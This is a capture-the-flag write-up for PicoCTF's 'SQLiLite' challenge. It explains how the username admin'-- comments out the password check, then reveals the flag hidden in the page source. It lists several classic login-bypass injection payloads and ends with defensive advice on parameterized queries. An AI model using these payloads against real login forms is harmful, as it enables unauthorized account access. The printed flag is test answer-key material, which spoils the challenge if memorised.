## Introduction

The **SQLiLite** challenge on PicoCTF demonstrates SQL injection fundamentals — specifically how a comment sequence in the username field can completely bypass password verification. This is one of the most studied and historically impactful vulnerability classes in web security.

> **Challenge Description:** "Can you login to this website? Try to login at the website provided."

## Background: SQL Injection Login Bypass

A typical vulnerable login query looks like:

```sql
SELECT * FROM users
WHERE username = '$username'
AND password = '$password';
```

When `$username = "admin'--"` and `$password = "anything"`, the query becomes:

```sql
SELECT * FROM users
WHERE username = 'admin'--' AND password = 'anything';
```

Everything after `--` is a SQL comment and is ignored by the database engine. The query reduces to:

```sql
SELECT * FROM users WHERE username = 'admin';
```

If a user named `admin` exists, the login succeeds regardless of password.

## Solution Walkthrough

### Step 1: Open the Challenge Website

Navigate to the challenge URL. A login form is presented with `Username` and `Password` fields.

### Step 2: Observe the Debug Output

The page has a helpful (vulnerability-confirming) feature: it displays the actual SQL query being executed. After entering a test username, the page shows something like:

```sql
SELECT * FROM users WHERE name='[input]' AND password='[password]'
```

This confirms the vulnerability is present and reveals the query structure.

### Step 3: Inject the Payload

Enter the following credentials:

| Field | Value |
|---|---|
| **Username** | `admin'--` |
| **Password** | (anything, e.g., `password`) |

The injected query becomes:

```sql
SELECT * FROM users WHERE name='admin'--' AND password='...'
```

The password check is commented out. The application logs in as `admin`.

### Step 4: Success — Check the Page Source

After login, the page might show a "Logged in" message or a near-blank admin page. The flag is **not visible in the rendered page**. Check the HTML source:

```
Ctrl + U   (or right-click → View Page Source)
```

Scroll through the source and look for an HTML comment containing the flag:

```html
<!-- picoCTF{L00k5_l1k3_y0u_solv3d_it_ec8a64c7} -->
```

## Key Concepts

**SQLite vs. MySQL Comment Syntax:**

| DBMS | Single-line Comment | Notes |
|---|---|---|
| MySQL | `--` (requires trailing space) or `#` | `-- -` is a safe variant |
| SQLite | `--` | Works without trailing space |
| PostgreSQL | `--` | Works without trailing space |
| MSSQL | `--` or `/**/` | |

This challenge uses an SQLite backend (indicated by the name "SQLiLite"), which makes bare `--` work reliably.

**Other Classic Login Bypass Payloads:**

```sql
' OR '1'='1          -- Always-true condition
' OR 1=1--           -- Always-true with comment
admin'--             -- Comment out password check (most reliable)
' OR 'x'='x          -- Equivalent always-true
```

## Security Insights

- **Parameterized Queries (Prepared Statements) are the fix:** Never concatenate user input directly into SQL strings. Use parameterized queries or ORM abstractions.
- **Principle of defense in depth:** Even if SQL injection is prevented, limit database user privileges — the web app user should not have SELECT access to sensitive tables beyond its functional requirements.
- **Hiding data in HTML comments is not security:** Placing flags or sensitive values in HTML source comments is trivially readable via View Source — never hide secrets client-side.
- **Error messages reveal structure:** The challenge's debug output showing the live SQL query is a critical information disclosure vulnerability (CWE-209) in its own right.

---

## Conclusion

SQLiLite is a textbook demonstration of login bypass via SQL comment injection. The challenge also rewards thorough post-exploitation enumeration — the flag is not served on the visible page but is hidden in the page source, teaching the habit of always checking full server responses rather than just the rendered UI.
